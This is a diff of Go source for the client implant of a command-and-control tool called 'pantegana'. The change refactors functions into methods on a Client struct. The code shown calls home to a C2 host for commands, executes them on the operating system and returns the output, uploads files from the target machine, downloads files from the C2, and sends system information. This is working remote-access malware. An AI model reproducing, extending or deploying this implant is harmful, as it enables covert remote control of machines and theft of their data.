@@ -18,53 +18,59 @@ import (
 
 // RequestCommand sends a HTTPS GET request to the master pantegana server
 // /getCmd endpoint and returns the parsed command string.
-func RequestCommand(client *http.Client, host string, port int) (string, string) {
+func (c *Client) RequestCommand() string {
 	log.Println("[+] Calling home to c2 to get cmd...")
 
 	var httpstr string
-	if hasTLS {
+	if c.Cfg.HasTLS {
 		httpstr = "https"
 	} else {
 		httpstr = "http"
 	}
 
-	hoststr := fmt.Sprintf("%s://%s:%d", httpstr, host, port)
+	hoststr := fmt.Sprintf("%s://%s:%d", httpstr, c.Cfg.Host, c.Cfg.Port)
 
 	req, err := http.NewRequest("GET", hoststr+getCmdURL, nil)
 	if err != nil {
 		log.Printf("[-] Error creating the GET request: %s\n", err)
 	}
 
-	req.Header.Add("Token", ClientToken)
+	req.Header.Add("Token", c.Token)
 
-	resp, err := client.Do(req)
+	resp, err := c.HTTP.Do(req)
 	if err != nil {
 		log.Printf("[-] Got error when requesting cmd: %s\n", err)
-		log.Println("Retrying in 5 seconds...")
 		if strings.Contains(err.Error(), ErrHTTPResponse.Error()) {
 			// try with plaintext HTTP
-			hasTLS = false
+			c.Cfg.HasTLS = false
+			defer log.Printf("[+] Retrying with HTTP...\n")
+			return c.RequestCommand()
 		}
+		log.Println("Retrying in 5 seconds...")
 		time.Sleep(5 * time.Second)
-		return RequestCommand(client, host, port)
+		return c.RequestCommand()
 	}
+
+	c.BaseURL = hoststr // Defining the BaseURL for the client
+
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		log.Printf("[-] Error while reading body of request: %s", err)
 	}
 	log.Printf("[+] Got cmd from backend:\n%s\n", body)
 	if string(body) == "Client sent an HTTP request to an HTTPS server.\n" {
-		hasTLS = true
+		c.Cfg.HasTLS = true
 		defer log.Printf("[+] Retrying with HTTPS...\n")
+		return c.RequestCommand()
 	}
 
 	defer resp.Body.Close()
-	return strings.Trim(string(body), " \n\r"), hoststr
+	return strings.Trim(string(body), " \n\r")
 }
 
 // ExecAndGetOutput executes the command string on the OS
 // and returns the combined output.
-func ExecAndGetOutput(client *http.Client, url string, cmdString string) {
+func (c *Client) ExecAndGetOutput(url string, cmdString string) {
 	log.Println("[+] Executing cmd...")
 	cmdTokens := strings.Split(cmdString, " ")
 	log.Println(cmdTokens)
@@ -82,14 +88,14 @@ func ExecAndGetOutput(client *http.Client, url string, cmdString string) {
 		return
 	}
 
-	req.Header.Add("Token", ClientToken)
+	req.Header.Add("Token", c.Token)
 	req.Header.Set("Content-Type", "text/html")
 
-	client.Do(req)
+	c.HTTP.Do(req)
 }
 
 // UploadFile uploads a local file on the target machine to the c2.
-func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
+func (c *Client) UploadFile(url string, localFilePath string, remoteFilePath string) {
 	// open the file of interest
 	file, err := os.Open(localFilePath)
 	if err != nil {
@@ -122,7 +128,7 @@ func UploadFile(client *http.Client, url string, localFilePath string, remoteFil
 	}
 
 	// send it off
-	_, err = client.Do(req)
+	_, err = c.HTTP.Do(req)
 	if err != nil {
 		log.Printf("[-] Error sending upload request: %s\n", err)
 		return
@@ -131,10 +137,10 @@ func UploadFile(client *http.Client, url string, localFilePath string, remoteFil
 }
 
 // DownloadFile downloads a file from the c2 to the local target machine.
-func DownloadFile(client *http.Client, url string, filePath string) {
+func (c *Client) DownloadFile(url string, filePath string) {
 	// get the file data
 	log.Println(url)
-	resp, err := client.Get(url)
+	resp, err := c.HTTP.Get(url)
 	if err != nil {
 		log.Printf("[-] Error getting file to download from c2: %s\n", err)
 		return
@@ -160,7 +166,7 @@ func DownloadFile(client *http.Client, url string, filePath string) {
 	log.Println("[+] Successfully downloaded file")
 }
 
-func SendSysInfo(client *http.Client, url string, sysInfo SysInfo) {
+func (c *Client) SendSysInfo(url string, sysInfo SysInfo) {
 	data, _ := json.Marshal(sysInfo)
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
 	if err != nil {
@@ -168,8 +174,8 @@ func SendSysInfo(client *http.Client, url string, sysInfo SysInfo) {
 		return
 	}
 
-	req.Header.Add("Token", ClientToken)
+	req.Header.Add("Token", c.Token)
 	req.Header.Set("Content-Type", "application/json")
 
-	client.Do(req)
+	c.HTTP.Do(req)
 }
